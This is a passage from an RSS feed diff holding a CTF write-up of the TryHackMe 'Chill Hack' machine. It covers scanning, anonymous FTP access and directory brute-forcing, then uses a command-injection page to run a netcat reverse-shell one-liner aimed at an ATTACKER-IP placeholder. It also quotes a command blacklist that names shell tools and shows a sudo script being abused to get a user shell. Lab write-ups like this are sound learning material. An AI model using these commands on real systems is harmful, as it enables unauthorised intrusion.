+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;First things first, I start enumerating the FTP port wishing that it accepts anonymous login:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp 10.10.146.220
+Connected to 10.10.146.220.
+220 (vsFTPd 3.0.3)
+Name (10.10.146.220:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -al
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
+drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
+-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+226 Directory send OK.
+ftp&amp;gt; get note.txt
+local: note.txt remote: note.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note.txt (90 bytes).
+226 Transfer complete.
+90 bytes received in 0.00 secs (703.1249 kB/s)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a &lt;em&gt;note.txt&lt;/em&gt; file. 
+I download it using the &lt;em&gt;get&lt;/em&gt; command.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Anurodh told me that there is some filtering on strings being put in the command – Apaar&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Well, that sounds cool, we got a hint, there’s some filtration out there for strings. (Hope that it’s not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration).&lt;/p&gt;
+
+&lt;p&gt;Let’s move on for the HTTP server:
+&lt;img src=&quot;/assets/images/writeups/thm/Chill hack/HTTP_server.png&quot; alt=&quot;HTTP Server&quot; /&gt;
+Nothing too fancy here, just some random theme running.&lt;/p&gt;
+
+&lt;p&gt;So I ran &lt;em&gt;gobuster&lt;/em&gt; for some directory searching.
+After some minutes of directory bruteforcing here’s the result :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@kali:~/Documents/thm/game_info# gobuster dir -u http://10.10.146.220/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 2&amp;gt;/dev/null 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.146.220/
+[+] Threads:        200
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/18 07:29:47 Starting gobuster
+===============================================================
+/images (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/secret (Status: 301)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Well, as it’s in easy level, that was kinda expected.
+There’s a &lt;em&gt;/secret&lt;/em&gt; directory. 
+Let’s check it inside our browser : 
+&lt;img src=&quot;/assets/images/writeups/thm/chillhack/secret_directory.png&quot; alt=&quot;/secret&quot; /&gt;
+Hmm, a field expecting a command and an execute button, with a silly animation ! 
+Let’s execute an &lt;em&gt;ls&lt;/em&gt; command and see what happens ? 
+&lt;img src=&quot;/assets/images/writeups/thm/chillhack/hacker.png&quot; alt=&quot;/hacker&quot; /&gt;
+So, there’s some filtration for some commands like ls.
+I tried &lt;em&gt;cat&lt;/em&gt;, &lt;em&gt;python&lt;/em&gt; and &lt;em&gt;nc&lt;/em&gt; commands but they’re all filtered. 
+I tried to split the commands with a semicolon but nothing changed. 
+So my final thought is that it filters some the string entered as an input.
+My first idea is to try a reverse shell found in &lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;highon coffee blog&lt;/a&gt; :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkfifo /tmp/lol;nc ATTACKER-IP PORT 0&amp;lt;/tmp/lol | /bin/sh -i 2&amp;gt;&amp;amp;1 | tee /tmp/lol
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/writeups/thm/chillhack/reverse.png&quot; alt=&quot;reverse&quot; /&gt;
+Looking at the index.php file found in the /var/www/html/secret directory, I found that my guessing was true, there’s a blacklist array which contains some commands that are gonna filtered later.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;$cmd = $_POST['command'];
+$store = explode(&quot; &quot;,$cmd);
+$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s spawn a tty shell and move on.
+Looking at the home directory, I found that there’s a directory called &lt;em&gt;apaar&lt;/em&gt; (remember the hint ?).
+After checking it, I found a local.txt file which I don’t have permission to read and a .helpline.sh file which can be run as apaar (after checking &lt;em&gt;sudo -l&lt;/em&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;User www-data may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed &lt;em&gt;/bin/bash&lt;/em&gt; to get a shell from the user &lt;em&gt;apaar&lt;/em&gt; and run any command we want !&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
+sudo -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: seif
+seif
+Hello user! I am seif,  Please enter your message: /bin/bash
+/bin/bash
+ls
+ls
+local.txt
+whoami
+whoami
+apaar
+cat local.txt
+cat local.txt
+{USER-FLAG: REDACTED-REDACTED-REDACTED}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Bingo ! We got the first flag&lt;/p&gt;
+</description>
+        <pubDate>Fri, 18 Dec 2020 00:00:00 +0100</pubDate>
+        <link>/seifallahhomrani1.github.io/THM-Chill-Hack/</link>
+        <guid isPermaLink="true">/seifallahhomrani1.github.io/THM-Chill-Hack/</guid>
+        
+        <category>THM</category>
+        
+        <category>TryHackMe</category>
+        
+        <category>WriteUp</category>
+        
+        <category>Chill Hack</category>
+        
+        <category>Medium</category>
+        
+        <category>CTF</category>
+        
+        
+        <category>CTF-WriteUp</category>
+        
+      </item>
+    
+  </channel>
+</rss>
